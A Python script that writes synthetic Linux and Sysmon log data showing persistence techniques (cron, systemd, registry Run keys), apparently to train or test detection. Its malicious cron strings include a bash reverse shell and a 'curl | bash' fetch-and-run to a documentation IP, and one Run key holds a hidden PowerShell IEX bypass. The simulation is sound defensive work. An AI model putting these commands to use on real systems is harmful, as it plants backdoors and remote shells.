#!/usr/bin/env python3
"""
Persistence Mechanism Simulation
Generates logs for cron jobs, systemd backdoors, and Windows Registry Run keys.
MITRE ATT&CK: T1053.003 - Cron, T1543.002 - Systemd Service, T1547.001 - Registry Run Keys
"""

import os
import json
import random
from datetime import datetime, timedelta

LINUX_OUTPUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs", "linux")
WINDOWS_OUTPUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs", "windows")

TARGET_HOST_LINUX = "prod-web-01"
TARGET_HOST_WINDOWS = "WS-FIN-PC04"
DOMAIN = "CORPSEC"


def generate_cron_persistence(base_time):
    """Generate cron job persistence logs."""
    logs = []
    metadata = []
    
    # Legitimate cron activity
    legit_crons = [
        "root CMD (/usr/bin/certbot renew --quiet)",
        "root CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))",
        "deploy CMD (/opt/app/scripts/backup.sh)",
        "root CMD (/usr/lib/apt/apt.systemd.daily)",
    ]
    for i in range(12):
        ts = base_time + timedelta(hours=random.randint(0, 47))
        ts_str = ts.strftime("%b %d %H:%M:%S")
        cron_entry = random.choice(legit_crons)
        logs.append((ts, f"{ts_str} {TARGET_HOST_LINUX} CRON[{random.randint(10000,30000)}]: ({cron_entry})"))
    
    # Malicious cron jobs
    attack_time = base_time + timedelta(hours=random.randint(6, 18))
    malicious_crons = [
        ("deploy", "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/198.51.100.23/4444 0>&1'"),
        ("deploy", "*/5 * * * * /tmp/.hidden/beacon.sh"),
        ("root", "0 */2 * * * curl -s http://198.51.100.23/update.sh | bash"),
    ]
    
    for i, (user, cron_cmd) in enumerate(malicious_crons):
        ts = attack_time + timedelta(minutes=i * 3)
        ts_str = ts.strftime("%b %d %H:%M:%S")
        
        # Crontab edit
        logs.append((ts, f"{ts_str} {TARGET_HOST_LINUX} crontab[{random.randint(20000,40000)}]: ({user}) REPLACE ({user})"))
        logs.append((ts + timedelta(seconds=1), f"{(ts + timedelta(seconds=1)).strftime('%b %d %H:%M:%S')} {TARGET_HOST_LINUX} CRON[{random.randint(20000,40000)}]: ({user}) CMD ({cron_cmd})"))
    
    metadata.append({
        "attack_type": "cron_persistence",
        "mitre_technique": "T1053.003",
        "mitre_tactic": "Persistence",
        "target_host": TARGET_HOST_LINUX,
        "start_time": attack_time.isoformat(),
        "malicious_crons": len(malicious_crons),
        "severity": "HIGH"
    })
    
    return logs, metadata


def generate_systemd_persistence(base_time):
    """Generate systemd backdoor persistence logs."""
    logs = []
    metadata = []
    
    attack_time = base_time + timedelta(hours=random.randint(8, 20))
    
    # Creating malicious systemd service
    events = [
        (0, f"deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee /etc/systemd/system/system-update.service"),
        (5, f"systemd[1]: Created slice system-update.service."),
        (6, f"systemd[1]: Starting System Update Service..."),
        (7, f"systemd[1]: Started System Update Service."),
        (10, f"deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl enable system-update.service"),
        (12, f"systemd[1]: Reloading daemon configuration."),
        (15, f"deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl start system-update.service"),
    ]
    
    for offset, msg in events:
        ts = attack_time + timedelta(seconds=offset)
        ts_str = ts.strftime("%b %d %H:%M:%S")
        if "sudo" in msg.lower() or "deploy :" in msg:
            logs.append((ts, f"{ts_str} {TARGET_HOST_LINUX} sudo: {msg}"))
        else:
            logs.append((ts, f"{ts_str} {TARGET_HOST_LINUX} {msg}"))
    
    metadata.append({
        "attack_type": "systemd_persistence",
        "mitre_technique": "T1543.002",
        "mitre_tactic": "Persistence",
        "target_host": TARGET_HOST_LINUX,
        "start_time": attack_time.isoformat(),
        "service_name": "system-update.service",
        "severity": "CRITICAL"
    })
    
    return logs, metadata


def generate_registry_persistence(base_time):
    """Generate Windows Registry Run key persistence logs (Sysmon-style)."""
    events = []
    metadata = []
    
    attack_time = base_time + timedelta(hours=random.randint(10, 22))
    
    # Legitimate registry events
    legit_entries = [
        {"process": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "target": "HKCU\\Software\\Google\\Chrome\\BrowserStartupSettings", "details": "\"1\""},
        {"process": "C:\\Windows\\System32\\svchost.exe", "target": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config", "details": "\"NTP\""},
    ]
    for entry in legit_entries:
        ts = base_time + timedelta(hours=random.randint(0, 24))
        events.append((ts, {
            "EventID": 13,
            "TimeCreated": ts.isoformat() + "Z",
            "Computer": f"{TARGET_HOST_WINDOWS}.{DOMAIN.lower()}.local",
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Provider": "Microsoft-Windows-Sysmon",
            "Level": "Information",
            "Task": "Registry value set",
            "EventData": {
                "EventType": "SetValue",
                "ProcessId": random.randint(1000, 8000),
                "Image": entry["process"],
                "TargetObject": entry["target"],
                "Details": entry["details"]
            }
        }))
    
    # Malicious Run key persistence
    malicious_entries = [
        {
            "process": "C:\\Windows\\System32\\cmd.exe",
            "target": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater",
            "details": "\"C:\\Windows\\Temp\\svc.exe -hidden\""
        },
        {
            "process": "C:\\Windows\\System32\\powershell.exe",
            "target": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth",
            "details": "\"powershell.exe -w hidden -ep bypass -c IEX(gc C:\\Users\\Public\\config.ps1)\""
        },
        {
            "process": "C:\\Windows\\System32\\reg.exe",
            "target": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\SystemRestore",
            "details": "\"C:\\ProgramData\\svchost.exe\""
        },
    ]
    
    for i, entry in enumerate(malicious_entries):
        ts = attack_time + timedelta(minutes=i * 5)
        events.append((ts, {
            "EventID": 13,
            "TimeCreated": ts.isoformat() + "Z",
            "Computer": f"{TARGET_HOST_WINDOWS}.{DOMAIN.lower()}.local",
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Provider": "Microsoft-Windows-Sysmon",
            "Level": "Information",
            "Task": "Registry value set",
            "EventData": {
                "RuleName": "technique_id=T1547.001,technique_name=Registry Run Keys",
                "EventType": "SetValue",
                "ProcessId": random.randint(1000, 8000),
                "Image": entry["process"],
                "User": f"{DOMAIN}\\svc_backup",
                "TargetObject": entry["target"],
                "Details": entry["details"]
            }
        }))
    
    metadata.append({
        "attack_type": "registry_run_key_persistence",
        "mitre_technique": "T1547.001",
        "mitre_tactic": "Persistence",
        "target_host": TARGET_HOST_WINDOWS,
        "start_time": attack_time.isoformat(),
        "malicious_keys": len(malicious_entries),
        "severity": "HIGH"
    })
    
    return events, metadata


def generate_persistence_logs(base_time=None):
    """Generate all persistence mechanism logs."""
    if base_time is None:
        base_time = datetime(2026, 2, 17, 0, 0, 0)
    
    all_metadata = []
    
    # Linux persistence
    cron_logs, cron_meta = generate_cron_persistence(base_time)
    systemd_logs, systemd_meta = generate_systemd_persistence(base_time)
    all_metadata.extend(cron_meta)
    all_metadata.extend(systemd_meta)
    
    # Combine and sort Linux logs
    linux_logs = cron_logs + systemd_logs
    linux_logs.sort(key=lambda x: x[0])
    
    # Write Linux logs (append)
    os.makedirs(LINUX_OUTPUT, exist_ok=True)
    with open(os.path.join(LINUX_OUTPUT, "auth.log"), "a") as f:
        for ts, entry in linux_logs:
            f.write(entry + "\n")
    
    # Windows persistence
    reg_events, reg_meta = generate_registry_persistence(base_time)
    all_metadata.extend(reg_meta)
    reg_events.sort(key=lambda x: x[0])
    
    # Write Sysmon events
    os.makedirs(WINDOWS_OUTPUT, exist_ok=True)
    sysmon_path = os.path.join(WINDOWS_OUTPUT, "sysmon_events.json")
    with open(sysmon_path, "w") as f:
        json.dump([e[1] for e in reg_events], f, indent=2)
    
    # Write metadata
    metadata_path = os.path.join(LINUX_OUTPUT, "persistence_metadata.json")
    with open(metadata_path, "w") as f:
        json.dump(all_metadata, f, indent=2)
    
    print(f"[+] Generated {len(linux_logs)} Linux persistence entries")
    print(f"[+] Generated {len(reg_events)} Windows Sysmon persistence events")
    print(f"[+] Attack metadata → {metadata_path}")
    
    return all_metadata


if __name__ == "__main__":
    generate_persistence_logs()
